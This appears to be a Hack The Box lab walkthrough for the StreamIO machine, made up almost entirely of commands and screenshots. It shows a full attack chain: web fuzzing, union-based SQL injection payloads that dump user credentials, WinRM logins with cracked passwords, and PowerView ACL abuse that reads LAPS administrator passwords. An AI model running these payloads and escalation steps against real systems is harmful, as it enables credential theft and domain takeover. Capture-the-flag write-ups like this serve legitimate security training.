```
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
https://watch.streamio.htb/search.php
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
https://crackstation.net/
https://streamio.htb/login.php
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
upload winPEASx64.exe
./winPEASx64.exe
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
```



```
nmap -sS -sC -sV -T5 -Pn 10.10.11.158
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1d9d63ec-98da-48dc-a9ca-8a36d393a754)


```
nano /etc/hosts
http://streamio.htb/
http://watch.streamio.htb/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4ad7db0f-8664-4569-acec-863ac85694aa)

![image](https://github.com/regarmulia/HTB/assets/33616880/fa2c28a7-e4ed-4c2c-b545-5501266e527d)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.158/FUZZ -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://watch.streamio.htb/aspnet_client/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bcb3c787-0be4-414a-aa4b-d13c7026594e)

![image](https://github.com/regarmulia/HTB/assets/33616880/a3ba0e61-0e94-417c-bf78-4c899acecd25)

![image](https://github.com/regarmulia/HTB/assets/33616880/35cf6102-f206-4d22-90d3-6edf6baf2d60)


```
https://streamio.htb/
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/66c5d747-edd2-459f-8d30-2fb9c7fcca3c)

![image](https://github.com/regarmulia/HTB/assets/33616880/cd007a1f-02d6-4512-8748-83b07fc1ed83)

![image](https://github.com/regarmulia/HTB/assets/33616880/4174f3e6-495d-45cb-8866-3da580fbb696)

![image](https://github.com/regarmulia/HTB/assets/33616880/728745d7-1f84-4590-bc15-336161ae50a5)


```
https://watch.streamio.htb/search.php
```
![image](https://user-images.githubusercontent.com/33616880/231679168-05ee4b46-32aa-44b9-9dc0-acdac11c53bb.png)


```
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,(SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6 -- -
10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```


![image](https://user-images.githubusercontent.com/33616880/231682312-5800f445-3c89-4aa3-8110-5de64c805117.png)
![image](https://user-images.githubusercontent.com/33616880/231682585-e0902d6b-7ac8-41c8-8a42-b7cd78fe1776.png)
![image](https://user-images.githubusercontent.com/33616880/231682816-1f5bd069-b658-41e1-8355-afecd16ba1b8.png)
![image](https://user-images.githubusercontent.com/33616880/231683062-e55c2a7f-0633-4bf9-b7d1-d1d76e48ba57.png)
![image](https://user-images.githubusercontent.com/33616880/231683260-9e522f56-bdb3-407f-86c4-7b7087301533.png)
![image](https://user-images.githubusercontent.com/33616880/231683518-ed431e05-ff5f-4803-811e-690220fd83e0.png)



![image](https://user-images.githubusercontent.com/33616880/231683958-c70902d2-5b01-42f5-8ff4-391b6e1921de.png)



https://streamio.htb/login.php
![image](https://user-images.githubusercontent.com/33616880/231684123-97a34f6f-ee6a-4801-9bff-0df23c33adbf.png)


yoshihide | 66boysandgirls..
![image](https://user-images.githubusercontent.com/33616880/231684191-deebb280-68bc-4a64-925e-27d2ae57c876.png)



![image](https://user-images.githubusercontent.com/33616880/231685199-5f8f77ea-2941-4e43-b790-ad255a05b590.png)



ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -fs 1678
![image](https://user-images.githubusercontent.com/33616880/231685748-72927c4a-a4d4-4c78-b3cd-1f1b79687378.png)


![image](https://user-images.githubusercontent.com/33616880/231685826-403dd7d3-9fbf-4633-9a0d-eadc14d8a6bd.png)



ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
![image](https://user-images.githubusercontent.com/33616880/231685928-48a47caa-43a2-4427-bf94-e1b796dd2339.png)


![image](https://user-images.githubusercontent.com/33616880/231686014-782672f5-2cd5-4701-ae65-e2c0a17b50a7.png)



crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
![image](https://user-images.githubusercontent.com/33616880/231686173-feab63d2-f0eb-4ace-8ffa-75df669cec01.png)



evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
![image](https://user-images.githubusercontent.com/33616880/231686295-621f2f18-be32-4e7e-90af-b0dada0b1254.png)



https://github.com/carlospolop/PEASS-ng/releases
```
upload winPEASx64.exe
./winPEASx64.exe
```
![image](https://user-images.githubusercontent.com/33616880/231686514-0c6ced70-5cf4-48e3-8951-6b9ba81b18e0.png)
![image](https://user-images.githubusercontent.com/33616880/231686548-aa5a6439-c37c-4f74-a300-568f7ac4193a.png)
![image](https://user-images.githubusercontent.com/33616880/231686573-5ded1f6d-582b-41dd-adbd-30e8fa3f7b43.png)



```
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
```
![image](https://user-images.githubusercontent.com/33616880/231689414-7ac352c9-8c51-4649-969a-1245d1e8da01.png)

```
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
```
![image](https://user-images.githubusercontent.com/33616880/231689571-2822ed95-a439-4a13-bd6d-ecf916b1e419.png)



![image](https://user-images.githubusercontent.com/33616880/231689606-cd64e06c-6078-48de-a790-ecdcf6537b66.png)



```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
```
![image](https://user-images.githubusercontent.com/33616880/231689707-f1d88d6e-c3cf-405a-8b91-7a4fe11edabf.png)



```
. .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

![image](https://user-images.githubusercontent.com/33616880/231689882-e7a2ef35-a3d0-4aa9-8f7f-2aa99b63203c.png)



evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
![image](https://user-images.githubusercontent.com/33616880/231689974-20ed5dca-92b5-43ec-b985-0d56bcfacec8.png)
![image](https://user-images.githubusercontent.com/33616880/231690002-65764103-055f-4f93-8761-26278c100fcf.png)
